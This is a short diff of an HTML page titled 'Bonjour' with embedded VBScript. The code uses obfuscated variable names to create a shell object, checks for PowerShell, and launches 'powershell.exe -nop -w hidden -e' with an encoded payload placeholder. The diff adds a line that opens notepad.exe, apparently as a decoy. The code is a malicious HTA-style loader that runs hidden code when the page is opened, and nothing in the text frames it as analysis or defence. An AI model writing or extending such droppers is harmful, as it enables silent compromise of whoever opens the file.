@@ -5,6 +5,7 @@
    <title>Bonjour</title>  
  <script language="VBScript">  
   Set owFrClN0giJ = CreateObject("Wscript.Shell")   
+  owFrClN0giJ.Run "notepad.exe" 
   Set v1ymUkaljYF = CreateObject("Scripting.FileSystemObject")  
   If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then  
    owFrClN0giJ.Run "powershell.exe -nop -w hidden -e <$$>B64_BNK<$$>"
